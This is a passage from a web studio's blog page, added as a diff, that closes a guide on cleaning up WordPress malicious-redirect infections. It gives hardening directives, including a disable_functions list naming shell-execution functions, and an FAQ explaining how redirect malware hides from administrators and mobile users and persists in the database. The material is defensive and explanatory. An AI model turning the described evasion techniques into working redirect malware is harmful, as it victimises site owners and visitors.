+│ PHP Runtime         │ - disable_functions = system, exec, shell_exec...│
+│                     │ - DISALLOW_FILE_EDIT = true in wp-config.php.    │
+├─────────────────────┼──────────────────────────────────────────────────┤
+│ Filesystem Security │ - Directories 755; files 644; wp-config.php 440. │
+│                     │ - Real-time File Integrity Monitoring (FIM).     │
+├─────────────────────┼──────────────────────────────────────────────────┤
+│ Access &amp; Identity   │ - Mandatory Two-Factor Authentication (2FA).     │
+│                     │ - Principle of least privilege for SQL users.    │
+└─────────────────────┴──────────────────────────────────────────────────┘
+</code></pre>
+<h3>Essential Hardening Directives</h3>
+<h4>1. Block PHP Execution in the Uploads Directory</h4>
+<p>Prevent attackers from executing uploaded scripts even if an arbitrary file upload flaw is discovered in a third-party plugin:</p>
+<p><strong>For Nginx:</strong></p>
+<pre><code class="language-nginx">## Deny execution of PHP scripts inside media directories
+location ~* ^/wp-content/uploads/.*\.php$ {
+    deny all;
+    return 404;
+}
+</code></pre>
+<p><strong>For Apache (<code>/wp-content/uploads/.htaccess</code>):</strong></p>
+<pre><code class="language-apache">## Deny all direct execution of PHP files in uploads
+&lt;Files *.php&gt;
+    deny from all
+&lt;/Files&gt;
+</code></pre>
+<h4>2. Disable Dashboard Code Editing</h4>
+<p>Add this directive to <code>wp-config.php</code> above the <code>/* That's all, stop editing! */</code> line to prevent attackers who compromise an admin account from modifying PHP files via the WordPress dashboard editor:</p>
+<pre><code class="language-php">define('DISALLOW_FILE_EDIT', true);
+</code></pre>
+<h4>3. Disable Hazardous PHP Functions</h4>
+<p>In your production <code>php.ini</code>, disable system execution wrappers that standard CMS applications never require:</p>
+<pre><code class="language-ini">disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_multi_exec,parse_ini_file,show_source
+</code></pre>
+<p>To implement these architectural protections systematically across your server fleet, explore our dedicated <a href="/services/website-security-hardening">Website Security Hardening &amp; Perimeter Lockdown</a> service.</p>
+<hr />
+<h2>13. Frequently Asked Questions (FAQ)</h2>
+<h3>1. Why does my WordPress site redirect only on mobile devices?</h3>
+<p>Attackers intentionally program conditional gating logic using the HTTP <code>User-Agent</code> header. Mobile traffic commands higher ad arbitrage and affiliate payouts, while mobile users are far less likely to inspect network waterfalls or examine page source code. Restricting the redirect to mobile devices also conceals the compromise from site owners who browse their site primarily from desktop workstations.</p>
+<h3>2. Why can't I reproduce the redirect when logged in as an administrator?</h3>
+<p>Malicious redirect scripts inspect incoming browser cookies for WordPress session tokens (such as <code>wordpress_logged_in_*</code>). If the script detects an active administrator session, it suppresses the redirect and renders the authentic site cleanly. This stealth mechanism ensures administrators remain unaware of the problem until external customers report it.</p>
+<h3>3. Can a modified .htaccess file cause a WordPress redirect hack?</h3>
+<p>Yes. Apache and LiteSpeed web servers process <code>.htaccess</code> rewrite rules before WordPress core or PHP scripts are evaluated. Attackers insert conditional <code>RewriteCond</code> rules matching mobile user-agents and search engine referrers, routing visitors to external domains via HTTP 302 headers before any WordPress application logic executes.</p>
+<h3>4. Can a malicious redirect survive after all infected files are deleted?</h3>
+<p>Yes. If the redirect logic is stored within the MySQL database (such as modified <code>siteurl</code>/<code>home</code> records in <code>wp_options</code>, autoloaded transient scripts, or injected <code>&lt;script&gt;</code> tags in <code>wp_posts</code>), replacing physical files on disk will not remove the redirect. Complete remediation requires sanitizing both the filesystem and the database simultaneously.</p>
+<h3>5. How do I determine whether a redirect is driven by JavaScript or server-side configuration?</h3>
+<p>Inspect the raw HTTP response headers using <code>curl -sIL -A "Mobile User Agent" https://example.com/</code>. If the server immediately returns an <code>HTTP/1.1 301</code> or <code>302</code> response with a <code>Location:</code> header pointing to the external domain, the redirect is executed server-side (.htaccess, Nginx, or PHP). If the server returns an <code>HTTP/1.1 200 OK</code> document containing inline script tags (<code>window.location = ...</code>), the redirect is executed client-side via JavaScript.</p>
+<h3>6. Why did our automated security plugin scan report zero malware while redirects continue?</h3>
+<p>Standard security plugins evaluate files on disk against databases of known malware signatures. Custom-obfuscated JavaScript, dynamic database options, and server rewrite directives (.htaccess) frequently evade static signature matching. Furthermore, if the redirect fetches configuration parameters dynamically from an external C2 server, no malicious code footprint exists on disk for the scanner to detect.</p>
+<h3>7. What forensic evidence should we preserve before cleaning a compromised site?</h3>
+<p>Always capture a complete, offline compressed archive of the entire web root (<code>tar -czf</code>) and an authoritative database export (<code>mysqldump</code>) before modifying or deleting a single file. Additionally, archive your recent web server access logs (<code>access.log</code> and <code>error.log</code>) to preserve timestamp evidence linking rogue file modifications to specific IP addresses and entry vectors.</p>
+<hr />
+<h2>14. Related Security Guides &amp; Specialized Services</h2>
+<p>Managing a complex WordPress redirect infection requires structured forensic engineering. If your organization is combating recurring redirects, search engine blacklisting, or persistent security compromises, review our technical resources and specialized incident response capabilities:</p>
+<ul>
+<li><strong>Dedicated Redirect Remediation:</strong> <a href="/services/malicious-redirect-removal">WordPress Malicious Redirect Removal &amp; Cleanup</a></li>
+<li><strong>Backdoor &amp; Web Shell Neutralization:</strong> <a href="/services/wordpress-backdoor-removal">WordPress Backdoor Removal &amp; Forensic Incident Response</a></li>
+<li><strong>Comprehensive Incident Response:</strong> <a href="/services/wordpress-malware-removal">WordPress Malware Removal &amp; Hacked Site Recovery</a></li>
+<li><strong>Architecture &amp; Code Audits:</strong> <a href="/services/wordpress-security-audit">WordPress Security Audit &amp; Hardening Review</a></li>
+<li><strong>Perimeter Defense:</strong> <a href="/services/website-security-hardening">Website Security Hardening &amp; Threat Prevention</a></li>
+<li><strong>Underlying Persistence Vectors:</strong> Read our deep forensic investigation into <a href="/blog/wordpress-backdoors-stealth-web-shells">WordPress Backdoors &amp; Stealth Web Shells: Forensic Detection, Obfuscation Decoding, and Persistent Cron Eradication</a></li>
+<li><strong>Search Engine Poisoning Analysis:</strong> Read our companion guide on <a href="/blog/japanese-keyword-hack-wordpress">The Japanese Keyword Hack: Forensic Root-Cause Analysis, Cloaking Detection, and HTTP 410 Remediation</a></li>
+</ul>
+
+            </div>
+
+            <div style="margin-top: 3rem; padding-top: 1.5rem; border-top: 1px solid rgba(0,0,0,0.08);" id="articleTags">
+                <span class="tag-pill">#WordPress Security</span><span class="tag-pill">#Malware Removal</span><span class="tag-pill">#Forensics</span><span class="tag-pill">#Redirects</span><span class="tag-pill">#System Hardening</span>
+            </div>
+
+            <div style="margin-top: 4rem; padding: 2.5rem; background: #F8F8FA; border-radius: 24px; text-align: center;">
+                <h3 style="font-size: 1.5rem; font-weight: 800; margin-bottom: 0.5rem;">Have a bold idea to engineer?</h3>
+                <p style="color: #6b7280; font-size: 15px; margin-bottom: 1.25rem;">Let's build high-performance digital experiences together.</p>
+                <div style="display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; margin-bottom: 1.5rem;">
+                    <a href="/services/malicious-redirect-removal" style="font-size: 14px; font-weight: 600; color: #111111; text-decoration: underline; text-underline-offset: 4px;">
+                        Explore WordPress Malicious Redirect Removal & Injected Script Cleanup &rarr;
+                    </a>
+                </div>
+                <a href="/contact" class="rlvnt-btn max-content" style="margin: 0 auto;">
+                    <span>Start a Project</span>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 16 16"> 
+                        <circle cx="8" cy="8" r="8" fill="#C6FF00"></circle> 
+                        <path fill="#FFFFFF" d="M5.904 10.803a.5.5 0 1 1-.707-.707L9.293 6H6.525a.5.5 0 1 1 0-1H10.5a.5.5 0 0 1 .5.5v3.975a.5.5 0 0 1-1 0V6.707z"></path> 
+                    </svg>
+                </a>
+            </div>
+        </article>
+    </main>
+
+    <!-- UNIVERSAL GLOBAL FOOTER -->
+    <footer class="sections global-site-footer">
+        <div class="footer-top-strip">
+            <div class="footer-status-pill">
+                <span class="footer-status-dot"></span>
+                <span>Available for Select Projects</span>
+            </div>
+        </div>
+
+        <div class="services-header-2">
+            <div class="footer-headline-group">
+                <h3 class="services-title-2">Ready to talk?</h3>
+                <h3 class="services-title-2"><em>let’s build something <span style="font-family: 'Instrument Serif', Georgia, serif; font-style: italic; color: #111111; text-decoration: underline; text-decoration-color: #C6FF00; text-underline-offset: 6px;">iconic.</span></em></h3>
+            </div>
+            <a href="/contact" class="footer-cta-card-btn">
+                <span>Schedule Intro Call</span>
+                <svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 16 16">
+                    <circle cx="8" cy="8" r="8" fill="#C6FF00"></circle>
+                    <path fill="#111111" d="M5.904 10.803a.5.5 0 1 1-.707-.707L9.293 6H6.525a.5.5 0 1 1 0-1H10.5a.5.5 0 0 1 .5.5v3.975a.5.5 0 0 1-1 0V6.707z"></path>
+                </svg>
+            </a>
+        </div>
+
+        <div class="footer-grid-directory">
+            <div class="footer-col">
+                <div class="footer-col-header">// DIRECTORY</div>
+                <ul class="footer-links-list">
+                    <li><a href="/"><span>Home</span> <span class="nav-idx">01</span></a></li>
+                    <li><a href="/about"><span>About Studio</span> <span class="nav-idx">02</span></a></li>
+                    <li><a href="/services"><span>Services & Systems</span> <span class="nav-idx">03</span></a></li>
+                    <li><a href="/case-studies"><span>Case Studies</span> <span class="nav-idx">04</span></a></li>
+                    <li><a href="/blog"><span>Journal / Insights</span> <span class="nav-idx">05</span></a></li>
+                    <li><a href="/contact"><span>Discovery & Booking</span> <span class="nav-idx">06</span></a></li>
+                </ul>
+            </div>
+
+            <div class="footer-col">
+                <div class="footer-col-header">// DIRECT CHANNELS</div>
+                <div class="footer-contact-item">
+                    <span class="footer-contact-label">New Business & Inquiries</span>
+                    <a href="mailto:hello@kawakistudios.com" class="footer-contact-val">
+                        hello@kawakistudios.com
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>
+                    </a>
+                </div>
+                <div class="footer-contact-item" style="margin-top: 0.5rem;">
+                    <span class="footer-contact-label">Partnerships & Co-Ventures</span>
+                    <a href="mailto:partners@kawakistudios.com" class="footer-contact-val">
+                        partners@kawakistudios.com
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>
+                    </a>
+                </div>
+                <div class="footer-contact-item" style="margin-top: 0.5rem;">
+                    <span class="footer-contact-label">Direct Founder Calendar</span>
+                    <a href="/contact" class="footer-contact-val" style="color: #111111; font-weight: 600;">
+                        Book 15-Min Briefing ↗
+                    </a>
+                </div>
+            </div>
+
+            <div class="footer-col">
+                <div class="footer-col-header">// CLIENT TIME ZONES</div>
+                <div class="footer-time-badge">
+                    <div class="footer-time-city">
+                        <span>New Delhi — Studio HQ</span>
+                        <span class="footer-time-clock" id="footerTimeDelhi">--:-- -- IST</span>
+                    </div>
+                </div>
+                <div class="footer-time-badge">
+                    <div class="footer-time-city">
+                        <span>Tokyo — Client Time Zone</span>
+                        <span class="footer-time-clock" id="footerTimeTokyo">--:-- -- JST</span>
+                    </div>
+                </div>
+                <div class="footer-time-badge">
+                    <div class="footer-time-city">
+                        <span>London — Client Time Zone</span>
+                        <span class="footer-time-clock" id="footerTimeLondon">--:-- -- GMT</span>
+                    </div>
+                </div>
+                <div class="footer-time-badge">
+                    <div class="footer-time-city">
+                        <span>New York — Client Time Zone</span>
+                        <span class="footer-time-clock" id="footerTimeNY">--:-- -- EST</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="footer-col">
+                <div class="footer-col-header">// SOCIAL INDEX</div>
+                <ul class="footer-links-list">
+                    <li><a href="https://instagram.com/kawaki.agency" target="_blank" rel="noopener"><span>Instagram</span> <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></a></li>
+                    <li><a href="https://twitter.com/kawakistudios" target="_blank" rel="noopener"><span>X / Twitter</span> <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></a></li>
+                    <li><a href="https://linkedin.com/company/kawaki-studios" target="_blank" rel="noopener"><span>LinkedIn</span> <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></a></li>
+                    <li><a href="https://behance.net" target="_blank" rel="noopener"><span>Behance</span> <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></a></li>
+                    <li><a href="https://github.com/gusfing/kawaki" target="_blank" rel="noopener"><span>GitHub</span> <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></a></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="footer-giant-watermark">
+            <span>KAWAKI</span>
+        </div>
+
+        <div class="footer-bottom">
+            <div class="copyright">© 2026 Kawaki Studios. All rights reserved. — Custom Web Development &amp; Shopify Stores.</div>
+            <ul class="footer-bottom-links">
+                <li><a href="/about">Privacy Policy</a></li>
+                <li><a href="/about">Terms of Service</a></li>
+                <li><a href="/sitemap.xml" target="_blank" rel="noopener">Sitemap</a></li>
+                <li><a href="/robots.txt" target="_blank" rel="noopener">Robots.txt</a></li>
+                <li><a href="/llms.txt" target="_blank" rel="noopener">LLMs.txt</a></li>
+                </ul>
+            <button class="footer-back-to-top" id="backToTop" aria-label="Go to top">
+                <span>Back to Top</span>
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="18 15 12 9 6 15"></polyline></svg>
+            </button>
+        </div>
+    </footer>
+
+    <script src="/assets/js/main.js?v=20260902_luxury_v6" defer></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            // Time update helper for footer
+            function updateFooterClocks() {
+                const now = new Date();
+                const opt = (tz) => ({ timeZone: tz, hour: '2-digit', minute: '2-digit', hour12: true });
+                const elDelhi = document.getElementById('footerTimeDelhi');
+                const elTokyo = document.getElementById('footerTimeTokyo');
+                const elLondon = document.getElementById('footerTimeLondon');
+                const elNY = document.getElementById('footerTimeNY');
+                if (elDelhi) elDelhi.innerText = `${now.toLocaleTimeString('en-US', opt('Asia/Kolkata'))} IST`;
+                if (elTokyo) elTokyo.innerText = `${now.toLocaleTimeString('en-US', opt('Asia/Tokyo'))} JST`;
+                if (elLondon) elLondon.innerText = `${now.toLocaleTimeString('en-US', opt('Europe/London'))} GMT`;
+                if (elNY) elNY.innerText = `${now.toLocaleTimeString('en-US', opt('America/New_York'))} EST`;
+            }
+            updateFooterClocks();
+            setInterval(updateFooterClocks, 10000);
+
+            // Back to top
+            const btt = document.getElementById('backToTop');
+            if (btt) {
+                btt.addEventListener('click', () => {
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                });
+            }
+        });
+    </script>
+    <script src="/assets/js/chatbot.js?v=20260902_pill_v3" defer></script>
+</body>
+</html>
